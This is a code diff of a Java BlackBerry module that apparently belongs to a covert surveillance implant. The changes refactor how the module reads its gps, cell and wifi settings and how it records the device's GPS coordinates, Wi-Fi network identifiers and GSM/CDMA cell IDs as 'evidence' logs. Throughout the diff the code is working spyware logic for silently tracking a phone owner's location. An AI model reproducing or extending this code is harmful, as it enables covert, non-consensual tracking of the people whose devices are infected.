@@ -28,6 +28,8 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.Status;
 import blackberry.config.Conf;
+import blackberry.config.ConfModule;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -41,7 +43,8 @@ import blackberry.utils.Utils;
 /**
  * The Class PositionAgent.
  */
-public final class ModulePosition extends BaseModule implements LocationObserver {
+public final class ModulePosition extends BaseInstantModule implements
+        LocationObserver {
     private static final int TYPE_GPS = 1;
     private static final int TYPE_CELL = 2;
     private static final int TYPE_WIFI = 4;
@@ -80,32 +83,34 @@ public final class ModulePosition extends BaseModule implements LocationObserver
 
     boolean waitingForPoint = false;
 
-    /**
-     * Instantiates a new position agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public ModulePosition(final boolean agentEnabled) {
-        super(AGENT_POSITION, agentEnabled, Conf.AGENT_POSITION_ON_SD,
-                "PositionAgent");
-    }
+    public boolean parse(ConfModule conf) {
 
-    /**
-     * Instantiates a new position agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModulePosition(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
+        try {
+            gpsEnabled = conf.getBoolean("gps");
+            cellEnabled = conf.getBoolean("cell");
+            wifiEnabled = conf.getBoolean("wifi");
+        } catch (ConfigurationException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("parse");
+            //#endif
+            return false;
+        }
 
-        logWifi = evidence;
-        logGps = new Evidence(evidence);
-        logCell = new Evidence(evidence);
+        //#ifdef DEBUG
+        debug.trace(" Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace(" Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace(" Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+        //#endif
+
+        setPeriod(NEVER);
+        setDelay(POSITION_DELAY);
+
+        logWifi = new Evidence(EvidenceType.LOCATION_NEW);
+        logGps = new Evidence(EvidenceType.LOCATION_NEW);
+        logCell = new Evidence(EvidenceType.LOCATION_NEW);
+
+        return true;
     }
 
     public void actualStart() {
@@ -164,7 +169,7 @@ public final class ModulePosition extends BaseModule implements LocationObserver
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public void actualGo() {
+    public void actualGoOld() {
         //#ifdef DEBUG
         debug.trace("actualRun");
         //#endif
@@ -196,7 +201,7 @@ public final class ModulePosition extends BaseModule implements LocationObserver
         }
     }
 
-    public void actualStop() {
+    public void actualStopOld() {
 
         if (gpsEnabled) {
             if (lp != null) {
@@ -232,8 +237,7 @@ public final class ModulePosition extends BaseModule implements LocationObserver
             final byte[] payload = getWifiPayload(wifi.getBSSID(),
                     wifi.getSSID(), wifi.getSignalLevel());
 
-            logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
-                    EvidenceType.LOCATION_NEW);
+            logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI));
             logWifi.writeEvidence(payload);
             logWifi.close();
         } else {
@@ -279,13 +283,12 @@ public final class ModulePosition extends BaseModule implements LocationObserver
             if (mcc != 0) {
                 final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
 
-                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM),
-                        EvidenceType.LOCATION_NEW);
+                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM));
                 saveEvidence(logCell, payload, LOG_TYPE_GSM);
                 logCell.close();
             }
 
-        } else if(Device.isCDMA()){
+        } else if (Device.isCDMA()) {
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
             //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
@@ -308,17 +311,16 @@ public final class ModulePosition extends BaseModule implements LocationObserver
 
             if (sid != 0) {
                 final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
-                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA),
-                        EvidenceType.LOCATION_NEW);
+                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA));
                 saveEvidence(logCell, payload, LOG_TYPE_CDMA);
                 logCell.close();
             }
-        }else if(Device.isIDEN()){
+        } else if (Device.isIDEN()) {
             //TODO IDEN
             //#ifdef DEBUG
             debug.error("locationCELL: IDEN not supported");
             //#endif
-        }else{
+        } else {
             //#ifdef DEBUG
             debug.error("locationCELL: not supported");
             //#endif
@@ -333,18 +335,18 @@ public final class ModulePosition extends BaseModule implements LocationObserver
             //#endif               
             return;
         }
-    
+
         if (waitingForPoint) {
             //#ifdef DEBUG
             debug.trace("waitingForPoint");
             //#endif
             return;
         }
-    
+
         synchronized (this) {
             LocationHelper.getInstance().locationGPS(lp, this, false);
         }
-    
+
     }
 
     public synchronized void newLocation(Location loc) {
@@ -382,8 +384,7 @@ public final class ModulePosition extends BaseModule implements LocationObserver
             //#endif
             final byte[] payload = getGPSPayload(qc, loc, timestamp);
 
-            logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
-                    EvidenceType.LOCATION_NEW);
+            logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS));
             saveEvidence(logGps, payload, TYPE_GPS);
             logGps.close();
         }
